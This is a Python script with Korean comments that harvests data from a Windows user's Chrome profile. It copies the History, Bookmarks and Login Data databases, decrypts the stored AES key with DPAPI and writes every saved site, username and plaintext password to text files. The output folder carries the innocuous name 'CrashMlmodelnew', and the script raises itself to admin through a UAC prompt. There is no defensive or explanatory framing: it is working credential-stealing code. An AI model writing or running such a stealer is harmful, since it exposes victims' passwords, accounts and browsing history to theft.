import os
import json
import sqlite3
import shutil
import datetime
import sys
import ctypes
from pathlib import Path
import win32crypt
from Crypto.Cipher import AES
import base64

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def get_chrome_datetime(chrome_date):
    return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=chrome_date)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_executable_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

def main():
    # 실행 파일의 경로를 기준으로 output_dir 설정
    base_dir = get_executable_dir()
    output_dir = os.path.join(base_dir, "CrashMlmodelnew")
    os.makedirs(output_dir, exist_ok=True)
    
    chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                              "Google", "Chrome", "User Data", "Default")
    
    try:
        key = get_encryption_key()
        
        # 1. 방문 기록 추출
        history_path = os.path.join(chrome_path, "History")
        if os.path.exists(history_path):
            temp_path = os.path.join(output_dir, "History")
            shutil.copy2(history_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            
            with open(os.path.join(output_dir, "chrome_history.txt"), "w", encoding="utf-8") as f:
                f.write("=== Chrome 방문 기록 ===\n\n")
                for row in cursor.fetchall():
                    url = row[0]
                    title = row[1]
                    visit_time = get_chrome_datetime(row[2])
                    f.write(f"URL: {url}\nTitle: {title}\nVisit Time: {visit_time}\n\n")
            
            conn.close()
            os.remove(temp_path)  # 임시 파일 삭제
        
        # 2. 북마크 추출
        bookmarks_path = os.path.join(chrome_path, "Bookmarks")
        if os.path.exists(bookmarks_path):
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                bookmarks = json.load(f)
            
            def extract_bookmarks(node, file, level=0):
                if isinstance(node, dict):
                    if node.get('type') == 'folder':
                        file.write(f"\n{'  ' * level}[폴더] {node.get('name', '이름 없음')}\n")
                        if 'children' in node:
                            for child in node['children']:
                                extract_bookmarks(child, file, level + 1)
                    elif node.get('type') == 'url':
                        file.write(f"{'  ' * level}제목: {node.get('name', '제목 없음')}\n")
                        file.write(f"{'  ' * level}URL: {node.get('url', 'URL 없음')}\n")
                        if 'date_added' in node:
                            timestamp = node['date_added']
                            try:
                                date = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
                                file.write(f"{'  ' * level}추가 날짜: {date.strftime('%Y-%m-%d %H:%M:%S')}\n")
                            except:
                                file.write(f"{'  ' * level}추가 날짜: 날짜 변환 실패\n")
                        file.write("\n")
                    elif isinstance(node, dict):
                        for key in ['bookmark_bar', 'other', 'synced']:
                            if key in node:
                                extract_bookmarks(node[key], file, level)
            
            with open(os.path.join(output_dir, "chrome_bookmarks.txt"), "w", encoding="utf-8") as f:
                f.write("=== Chrome 북마크 ===\n")
                if 'roots' in bookmarks:
                    for root_name, root_node in bookmarks['roots'].items():
                        f.write(f"\n=== {root_name.upper()} ===\n")
                        extract_bookmarks(root_node, f)
        
        # 3. 저장된 비밀번호 추출
        login_db = os.path.join(chrome_path, "Login Data")
        if os.path.exists(login_db):
            temp_path = os.path.join(output_dir, "Login Data")
            shutil.copy2(login_db, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            with open(os.path.join(output_dir, "chrome_passwords.txt"), "w", encoding="utf-8") as f:
                f.write("=== Chrome 저장된 비밀번호 ===\n\n")
                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    password = decrypt_password(row[2], key)
                    if username or password:
                        f.write(f"URL: {origin_url}\nUsername: {username}\nPassword: {password}\n\n")
            
            conn.close()
            os.remove(temp_path)  # 임시 파일 삭제
            
    except Exception as e:
        with open(os.path.join(output_dir, "error_log.txt"), "w", encoding="utf-8") as f:
            f.write(f"에러 발생 시간: {datetime.datetime.now()}\n")
            f.write(f"에러 내용: {str(e)}\n")
            f.write(f"에러 타입: {type(e).__name__}")

if __name__ == "__main__":
    run_as_admin()
    main()
    print("데이터가 'CrashMlmodelnew' 폴더에 저장되었습니다.") 